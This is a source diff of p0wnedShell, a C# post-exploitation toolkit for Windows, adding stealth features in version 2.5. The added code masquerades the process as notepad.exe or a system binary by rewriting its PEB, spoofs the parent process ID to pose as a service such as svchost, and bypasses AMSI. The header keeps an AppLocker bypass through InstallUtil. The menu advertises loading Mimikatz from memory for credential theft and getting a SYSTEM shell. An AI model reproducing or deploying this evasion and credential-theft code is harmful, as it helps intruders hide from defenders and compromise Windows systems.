@@ -10,19 +10,24 @@
 * PowerShell Runspace Post Exploitation Toolkit                     *
 * A RedTeam Swiss Army Knife for Windows Based Systems              *
 *                                                                   *
-*                                                            v2.0   *
+*                                                            v2.5   *
 \*******************************************************************/
 
 /*
 License: BSD 3-Clause
 
-To Compile as x86 binary:
-cd \Windows\Microsoft.NET\Framework\v4.0.30319
-csc.exe /unsafe /reference:"C:\p0wnedShell\System.Management.Automation.dll" /reference:System.IO.Compression.dll /win32icon:C:\p0wnedShell\p0wnedShell.ico /out:C:\p0wnedShell\p0wnedShellx86.exe /platform:x86 "C:\p0wnedShell\*.cs"
+To compile p0wnedShell you need to open this project within Microsoft Visual Studio and build it for the x64/x86 platform.
+You can change the AutoMasq option before compiling (set AutoMasq to true/false and/or change the process name to masquerade)
 
-To Compile as x64 binary:
-cd \Windows\Microsoft.NET\Framework64\v4.0.30319
-csc.exe /unsafe /reference:"C:\p0wnedShell\System.Management.Automation.dll" /reference:System.IO.Compression.dll /win32icon:C:\p0wnedShell\p0wnedShell.ico /out:C:\p0wnedShell\p0wnedShellx64.exe /platform:x64 "C:\p0wnedShell\*.cs"
+How to use it:
+
+With AutoMasq set to false, you just run the executable so it runs normally.
+With AutoMasq enabled, you could rename the p0wnedShell executable as the process you are going to masquerade so it has the appearance of that process (for example notepad.exe).
+
+Using the optional "-parent" commandline argument, you can start p0wnedShell using another Parent Process ID.
+When combining the PEB Masq option and different parent process ID (for example svchost), you can give p0wnedShell the appearance of a legitimate service ;) 
+
+Note: Running p0wnedShell using another Parent Process ID doesn't work from a Meterpreter session/shell.... yet!
 
 To run as x86 binary and bypass Applocker (Credits for this great bypass go to Casey Smith aka subTee):
 cd \Windows\Microsoft.NET\Framework\v4.0.30319
@@ -37,24 +42,26 @@ using System;
 using System.IO;
 using System.Net;
 using System.Text;
-using System.Linq;
 using System.Globalization;
 using System.Reflection;
-using System.IO.Compression;
-using System.Collections.Generic;
-using System.Configuration.Install;
-using System.Runtime.InteropServices;
-using System.Security.Cryptography;
-using System.DirectoryServices.ActiveDirectory;
-
-//Add For PowerShell Invocation
 using System.Collections.ObjectModel;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Security.Principal;
+using System.Runtime.InteropServices;
+using System.DirectoryServices.ActiveDirectory;
+
 
 namespace p0wnedShell
 {
+    public static class p0wnedShellOpsec
+    {
+        public static bool AutoMasq = true;
+        public static string masqBinary = @"C:\Windows\notepad.exe";
+        //public static string masqBinary = Environment.SystemDirectory + @\wbem\WmiPrvSE.exe";
+        //public static string masqBinary = Environment.SystemDirectory + @"\WindowsPowerShell\v1.0\powershell.exe";
+    }
+
     [System.ComponentModel.RunInstaller(true)]
     public class InstallUtil : System.Configuration.Install.Installer
     {
@@ -67,7 +74,35 @@ namespace p0wnedShell
         //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            Program.Main();
+            Program.Entry();
+        }
+    }
+
+    public static class ConsoleEx
+    {
+        public enum FileType { Unknown, Disk, Char, Pipe };
+        public enum StdHandle { Stdin = -10, Stdout = -11, Stderr = -12 };
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern FileType GetFileType(IntPtr handle);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr GetStdHandle(StdHandle std);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool SetStdHandle(StdHandle std, IntPtr handle);
+
+        public static bool IsOutputRedirected
+        {
+            get { return FileType.Char != GetFileType(GetStdHandle(StdHandle.Stdout)); }
+        }
+        public static bool IsInputRedirected
+        {
+            get { return FileType.Char != GetFileType(GetStdHandle(StdHandle.Stdin)); }
+        }
+        public static bool IsErrorRedirected
+        {
+            get { return FileType.Char != GetFileType(GetStdHandle(StdHandle.Stderr)); }
         }
     }
 
@@ -75,7 +110,10 @@ namespace p0wnedShell
     {
         public static void PrintBanner(string[] toPrint = null)
         {
-            Console.Clear();
+            if (!ConsoleEx.IsInputRedirected || !ConsoleEx.IsOutputRedirected || !ConsoleEx.IsErrorRedirected)
+            {
+                Console.Clear();
+            }
             Console.BackgroundColor = ConsoleColor.DarkBlue;
             Console.WriteLine(@"*********************************************************************");
             Console.WriteLine(@"*            ____                          _______ __         ____  *");
@@ -101,7 +139,7 @@ namespace p0wnedShell
                 procArch = "x64";
             }
 
-            Console.WriteLine(@"*                                                        v2.0  " + procArch + "  *");
+            Console.WriteLine(@"*                                                        v2.5  " + procArch + "  *");
             Console.WriteLine(@"*********************************************************************");
             Console.ResetColor();
             Console.WriteLine();
@@ -253,16 +291,84 @@ namespace p0wnedShell
             }
         }
 
-        public static void Main()
+        public static void Main(string[] args)
         {
-            Console.Title = "p0wnedShell - PowerShell Runspace Post Exploitation Toolkit";
-            Console.SetWindowSize(Math.Min(120, Console.LargestWindowWidth), Math.Min(55, Console.LargestWindowHeight));
+            // Get Assembly Path 
+            string BinaryPath = Assembly.GetExecutingAssembly().CodeBase;
+            string lpApplicationName = BinaryPath.Replace("file:///", string.Empty).Replace("/", @"\");
+
+            if (args.Length == 1 && args[0].ToLower() == "-parent")
+            {
+                Console.WriteLine("\n [+] Please enter a valid Parent Process name.");
+                Console.WriteLine(" [+] For Example: {0} -parent svchost", lpApplicationName);
+                return;
+            }
+            else if (args.Length == 2)
+            {
+                if (args[0].ToLower() == "-parent" && args[1] != null)
+                {
+                    string PPIDName = args[1];
+                    int NewPPID = 0;
+
+                    // Find PID from our new Parent and start new Process with new Parent ID
+                    NewPPID = ProcessCreator.NewParentPID(PPIDName);
+                    if (NewPPID == 0)
+                    {
+                        Console.WriteLine("\n [!] No suitable Process ID Found...");
+                        return;
+                    }
+
+                    if (!ProcessCreator.CreateProcess(NewPPID, lpApplicationName, null))
+                    {
+                        Console.WriteLine("\n [!] Oops PPID Spoof failed...");
+                        return;
+                    }
+                }
+            }
+            else
+            {
+                Entry();
+            }
+
+            return;
+        }
+
+
+        public static void Entry()
+        {
             string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
             string LatestOSVersion = "6.3";
             decimal latestOSVersionDec = decimal.Parse(LatestOSVersion, CultureInfo.InvariantCulture);
             if (Pshell.EnvironmentHelper.RtlGetVersion() > latestOSVersionDec)
             {
+                string MasqPath = p0wnedShellOpsec.masqBinary.Remove(p0wnedShellOpsec.masqBinary.LastIndexOf(@"\")).ToLower();
+                string SystemPath = Environment.SystemDirectory.ToLower();
+
                 AmsiBypass.Amsi(Arch);
+                if (p0wnedShellOpsec.AutoMasq && MasqPath == SystemPath)
+                {
+                    // Starting Runspace before we Masquerade our Process
+                    Pshell.P0wnedListener.Execute("Write-Host '[+] AMSI Bypassed'");
+                }
+            }
+
+            if (p0wnedShellOpsec.AutoMasq || ConsoleEx.IsInputRedirected || ConsoleEx.IsOutputRedirected)
+            {
+                Console.WriteLine("[+] Auto Masquerade our Process to: {0}", p0wnedShellOpsec.masqBinary);
+                if (!PEBMasq.MasqueradePEB(p0wnedShellOpsec.masqBinary))
+                {
+                    Console.WriteLine("[!] Auto Masquerade Failed :(");
+                }
+            }
+
+            if (!p0wnedShellOpsec.AutoMasq)
+            {
+                Console.Title = "p0wnedShell - PowerShell Runspace Post Exploitation Toolkit";
+            }
+
+            if (!ConsoleEx.IsInputRedirected || !ConsoleEx.IsOutputRedirected || !ConsoleEx.IsErrorRedirected)
+            {
+                Console.SetWindowSize(Math.Min(120, Console.LargestWindowWidth), Math.Min(55, Console.LargestWindowHeight));
             }
 
             int userInput = 0;
@@ -340,9 +446,10 @@ namespace p0wnedShell
 
             } while (userInput != 17);
 
-            if (File.Exists(Program.P0wnedPath() + "\\Amsi.dll"))
+            string TempFolder = Path.GetTempPath();
+            if (File.Exists(TempFolder + "\\Amsi.dll"))
             {
-                File.Delete(Program.P0wnedPath() + "\\Amsi.dll");
+                File.Delete(TempFolder + "\\Amsi.dll");
             }
         }
     }
@@ -422,7 +529,7 @@ namespace p0wnedShell
             }
         }
 
-        private static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();
+        public static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();
 
         public static void InvokeShell()
         {
@@ -438,7 +545,7 @@ namespace p0wnedShell
             Console.Write("[+] PowerSploit: Invoke-Mimikatz\n");
             Console.Write("[+] PowerSploit: Invoke-TokenManipulation\n");
             Console.Write("[+] PowerSploit: PowerUp and PowerView\n");
-            Console.Write("[+] Rasta Mouse: Sherlock\n");
+            Console.Write("[+] Rasta Mouse: Sherlock (Find-AllVulns)\n");
             Console.Write("[+] HarmJ0y's: Invoke-Psexec and Invoke-Kerberoast\n");
             Console.Write("[+] Rohan Vazarkar's: Invoke-BloodHound (C# Ingestor)\n");
             Console.Write("[+] Chris Campbell's: Get-GPPPassword\n");
@@ -450,6 +557,7 @@ namespace p0wnedShell
             Console.Write("[+] Kevin Robertson: Invoke-Inveigh and Invoke-InveighRelay\n");
             Console.Write("[+] FuzzySecurity: Invoke-MS16-032 and Invoke-MS16-135\n\n");
             Console.Write("[+] Use Get-Help <ModuleName> for syntax usage and Have Fun :)\n\n");
+            Console.Write("[+] Type mimikatz to reflective load Mimikatz from memory or easysystem to get a system shell\n\n");
             Console.ResetColor();
 
             P0wnedListener.CommandShell();
